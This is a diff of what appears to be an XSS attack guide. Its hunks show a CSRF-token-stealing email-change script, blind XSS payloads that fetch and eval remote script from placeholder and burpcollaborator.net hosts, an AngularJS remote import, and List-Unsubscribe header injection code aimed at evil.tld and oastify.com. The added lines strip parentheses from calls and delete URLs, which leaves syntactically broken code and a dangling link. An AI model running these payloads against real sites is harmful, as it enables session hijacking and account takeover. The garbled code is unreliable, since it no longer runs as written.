 
 Notes
 - This relies on execution order: your injection must execute before the legitimate declaration.
-- If your payload is wrapped in `eval(...)`, `const/let` bindings won’t become globals. Use the dynamic `<script>` injection technique from the section “Deliverable payloads with eval(atob()) and scope nuances” to ensure a true global, non-rebindable binding.
+- If your payload is wrapped in `eval(...)`, `const/let` bindings won’t become globals. Use the dynamic `<script>` injection technique from the section “Deliverable payloads with eval(atob) and scope nuances” to ensure a true global, non-rebindable binding.
 - When keyword filters block code, combine with Unicode-escaped identifiers or `eval(atob('...'))` delivery, as shown above.
 
 ### Keylogger
@@ -1584,13 +1584,13 @@ Just searching in github I found a few different ones:
 
 ```javascript
 <script>
-var req = new XMLHttpRequest();
+var req = new XMLHttpRequest;
 req.onload = handleResponse;
 req.open('get','/email',true);
-req.send();
-function handleResponse() {
+req.send;
+function handleResponse {
     var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
+    var changeReq = new XMLHttpRequest;
     changeReq.open('post', '/email/change-email', true);
     changeReq.send('csrf='+token+'&email=test@test.com')
 };
@@ -1615,7 +1615,7 @@ If a page **stores `event.origin` from a `postMessage` and later concatenates it
 window.addEventListener('message', (event) => {
   if (event.data.msg_type === 'IWL_BOOTSTRAP') {
     localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
-    startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
+    startIWL; // later loads `${host}/sdk/${pixelID}/iwl.js`
   }
 });
 ```
@@ -1642,7 +1642,7 @@ If uploaded files are parsed and their metadata is printed into HTML reports wit
 
 ```python
 xmlhost = data.getAttribute(f'{ns}:host')
-ret_list.append(('dialer_code_found', (xmlhost,), ()))
+ret_list.append(('dialer_code_found', (xmlhost,), ))
 'title': a_template['title'] % t_name  # %s fed by xmlhost
 ```
 
@@ -1672,7 +1672,7 @@ shadow-dom.md
 ### Polyglots
 
 
-https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
+
 
 ### Blind XSS payloads
 
@@ -1682,7 +1682,7 @@ You can also use: [https://xsshunter.com/](https://xsshunter.com)
 "><img src='//domain/xss'>
 "><script src="//domain/xss.js"></script>
 ><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>
+<script>function b{eval(this.responseText)};a=new XMLHttpRequest;a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send;</script>
 
 <!-- html5sec - Self-executing focus event via autofocus: -->
 "><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>
@@ -1740,7 +1740,7 @@ javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4Ln
 <meta http-equiv="refresh" content="0; url={SERVER}" />
 
 <!-- In case your target makes use of AngularJS -->
-{{constructor.constructor("import('{SERVER}/script.js')")()}}
+{{constructor.constructor("import('{SERVER}/script.js')")}}
 ```
 
 ### Regex - Access Hidden Content
@@ -1767,7 +1767,7 @@ console.log(
 ### Brute-Force List
 
 
-https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
+
 
 ## XSS Abusing other vulnerabilities
 
@@ -1843,7 +1843,7 @@ smtp_password = "REDACTED"
 sender = "list@example.org"
 recipient = "victim@example.org"
 
-msg = EmailMessage()
+msg = EmailMessage
 msg.set_content("Testing List-Unsubscribe rendering")
 msg["From"] = sender
 msg["To"] = recipient
@@ -1852,7 +1852,7 @@ msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
 msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"
 
 with smtplib.SMTP(smtp_server, smtp_port) as smtp:
-    smtp.starttls()
+    smtp.starttls
     smtp.login(smtp_user, smtp_password)
     smtp.send_message(msg)
 ```
@@ -1891,7 +1891,7 @@ dkim_selector = "default"
 dkim_domain = "example.org"
 dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""
 
-msg = EmailMessage()
+msg = EmailMessage
 msg.set_content("One-click unsubscribe test")
 msg["From"] = "list@example.org"
 msg["To"] = "victim@example.org"
@@ -1899,18 +1899,18 @@ msg["Subject"] = "Mailing list"
 msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
 msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"
 
-raw = msg.as_bytes()
+raw = msg.as_bytes
 signature = dkim.sign(
     message=raw,
-    selector=dkim_selector.encode(),
-    domain=dkim_domain.encode(),
-    privkey=dkim_private_key.encode(),
+    selector=dkim_selector.encode,
+    domain=dkim_domain.encode,
+    privkey=dkim_private_key.encode,
     include_headers=["From", "To", "Subject"]
 )
-msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")
+msg["DKIM-Signature"] = signature.decode.split(": ", 1)[1].replace("\r", "").replace("\n", "")
 
 with smtplib.SMTP(smtp_server, smtp_port) as smtp:
-    smtp.starttls()
+    smtp.starttls
     smtp.login(smtp_user, smtp_password)
     smtp.send_message(msg)
 ```
@@ -1991,7 +1991,7 @@ other-js-tricks.md
 
 ## XSS resources
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
+- [)
 - [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
 - [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
 - [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
@@ -2004,7 +2004,7 @@ other-js-tricks.md
 - [2] [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
 - [3] [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
 - [4] [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
-- [5] [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
+- [5] [MDN eval](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
 - [6] [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
 - [7] [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)
 - [8] [Improving the impact of a mouse-related XSS with styling and CSS Gadgets](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)
